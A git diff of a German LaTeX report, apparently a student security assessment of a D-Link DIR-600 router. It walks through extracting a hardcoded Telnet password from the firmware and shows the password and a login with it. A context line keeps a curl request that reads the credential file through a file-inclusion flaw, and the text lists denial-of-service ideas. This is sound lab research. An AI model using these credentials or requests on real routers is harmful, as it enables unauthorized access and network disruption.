@@ -849,19 +849,59 @@
 	oder Format-Strings im untersuchten Codeabschnitt sichbar sind, bleibt durch due unsauberen Datenflüsse und
 	die fehlende strikte Validierung ein erhötes Sicherheitsrisiko.
 
-	\subsection{Telnet Connection}
-	Der Computer ist mit dem Router übder das Ethernet Kanbel verbunden.
-	tenlent 192.169.0.1
-	Alphanetworks ist laut meherer Quellen der Standart nutzer für den Router
-	Passwort musste über den binwalk herausgefunden werden
+	\subsection{Telnet}
+	Teletype Networke (Telnet) ist ein Client/Server bassiertes Protokoll (Port 23), basierend auf einem zeichenbasierten austausch
+	über eine TCP Verbindung. Bei Routern dient Telnet als Remote-Management-Protokoll
+	und gibt dem Anwender eine Kommandozeile auf dem Gerät.
+	Mit folgendem Befehl ist es möglich herauszufinden ob der Router eine Telnet Schnittstelle besitzt.
+	\begin{lstlisting}
+	nc -zv 192.168.0.1 23
+	Connection to 192.168.0.1 23 port [tcp/telnet] succeeded!
+	\end{lstlisting}
+	Der D-Link DIR 600 besitzt eine Telnet-Schnittstelle, welche durch einen Nutzter und ein Passwort
+	geschützt sind. Unter einem Embedded Linux ist der Standartnutzer in den meisten Fällen \texttt{Alphanetworks}.
+	Dies lässt sich durch eine kurze Recherche über das Internet herausfinden. Das Standart Passwort des Routers unterscheidet sich
+	nach Modell. Um das Passwort der Telnet-Schnittstelle harauszufinden, wurden die Firmware des Routers
+	erneut analysiert.
+	\texttt{grep -r "Alphanetworks"}
+	\texttt{squashfs-root/etc/scripts/misc/telnetd\.sh: telnetd -l "/usr/sbin/login" -u Alphanetworks:\$image_sign -i \$lf &}
+	Mit dem grep Befehel wurde die Firmware nach dem Standartnutzer rekrusiv durchsucht.
+	Das Ergebniss zeigt den Nutzer und das Passowort, welches in \texttt{\$image_sign} gespeichert wird.
+	\texttt{grep -r "image_sign" squashfs-root/}
+	\texttt{squashfs-root/etc/scripts/misc/telnetd\.sh:image\_sign=`cat /etc/config/image_sign`}
+	Die Ausgabe zeigt unter anderem diese Zeile, welche den Pfad zu dem Passwort enthält.
+	\texttt{cat squashfs-root/etc/config/image\_sign}
+	\texttt{wrgn23\_dlwbr\_dir600b}
+	Der \texttt{cat-Befehl} liefert das Passwort.
+	\begin{lstlisting}
+	Trying 192.168.0.1...
+	Connected to 192.168.0.1.
+	Escape character is '^]'.
+	login: Alphanetworks
+	Password: wrgn23_dlwbr_dir600b
+	\end{lstlisting}
+	Die eingebaute Shell namens \texttt{Busybox} ist eine Custom-Shell die lediglich ein paar ausgewählte Linux-Befehle unterstützt.
+	Der Befehl \texttt{mount} zeigt folgendes:
+	\begin{lstlisting}
+	/dev/root on / type squashfs (ro)
+	none on /proc type proc (rw)
+	sysfs on /sys type sysfs (rw)
+	ramfs on /var type ramfs (rw)
+	\end{lstlisting}
+	Durch die Ausgabe wird deutlich, das es sich um eine Read-Only-Firmware mit einem Eingebetteten Linux Design handelt.
+	Lediglich der RAM ist beschreibar, jedoch sind die Daten dort nur während der Laufzeit verfügbar und verschwinden nach einem Reboot.
+	Dort werden typischerweise Logs, temporäre Dateien und Runtime-konfigurationen gespeichert.
+	/proc enthält Prozess- und Systeminformationen und /sys Kernelparameter und die Hardwareabstarktion.
+	Hier können Parameter gesetzt aber das System nicht persistent geändert werden.
+	
+	Auch wenn auf dem System Daten nicht persistent geändert werden können, stellt die Telnet-Schnittstelle ein
+	Risiko dar. Ein Angreifer könnte durch den befehl \texttt{reboot} eine sofortige Unterbrechung des Netztwerks
+	auslösen. Da Schreibrechte auf dem /var Verzeichniss exsistieren könnten dort viele und große Dateien erzeugt werden, um so den 
+	Speicher zu füllen und die Dienste zu destabalisieren. Dies könnte den Router erheblich verlangsamen oder zu einem 
+	reboot führen. Außerdem kann der Angreifer durch Befehle wie ping, msh, kill oder busybox Prozesse mehrfach starten und die CPU dauerhaft belasten.
+	Desweiteren können Routerkonfigurationen, die interne Netzstruktur, DNS und Gatewa sowie die aktiven Clients
+	eingesehen werden, was beim sammeln von Informationen erheblich helfen kann.
 
-	strings DIR600B_FW205b01.bin | grep -i -E "password|admin|alphanetworks|root|login"
-	telnetd -l "/usr/sbin/login" -u Alphanetworks:$image_sign -i $lf &
-
-	grep -r "image_sign" squashfs-root/
-	cat squashfs-root/etc/scripts/misc/telnetd.sh
-	cat squashfs-root/etc/config/image_sign
-	ls -la squashfs-root/etc/config/
 	curl -v -u "admin:cyber" "http://192.168.0.1/model/__show_info.php?REQUIRE_FILE=/etc/config/image_sign" \
   	-H "User-Agent: Mozilla/5.0"
 
@@ -870,13 +910,7 @@
 
 	strings config.bin | grep -i "image_sign\|password\|Alphanetworks"
 
-	\begin{lstlisting}
-	Trying 192.168.0.1...
-	Connected to 192.168.0.1.
-	Escape character is '^]'.
-	login: Alphanetworks
-	Password: wrgn23_dlwbr_dir600b
-	\end{lstlisting}
+
 
 	% --------------ToDo--------------------%
 	% Formatierung schön machen 
@@ -923,19 +957,6 @@
 
 	Erfolglose Versuche:
 	Folgende Schwachstellen wurden ebenfalls getestet, konnten aber nicht ausgenutzt werden:
-
-
-	\chapter{Hauptteil (1. Kapitel)}
-	Für die Gestaltung des Hauptteils sind in Abhängigkeit von der Aufgabenstellung
-	unterschiedliche Ausformungen möglich. In den Richtlinien zu Studien- und
-	Diplomarbeiten finden Sich hierzu Erläuterungen.
-	\newpage
-	
-	\chapter{Hauptteil (2. Kapitel)}
-	\newpage
-	
-	\chapter{Hauptteil (3. Kapitel)}
-	\newpage
 	
 	\chapter{Evaluierung}
 	Aufgabe des Kapitels Evaluierung ist es, aufzuzeigen in wie weit die Ziele der
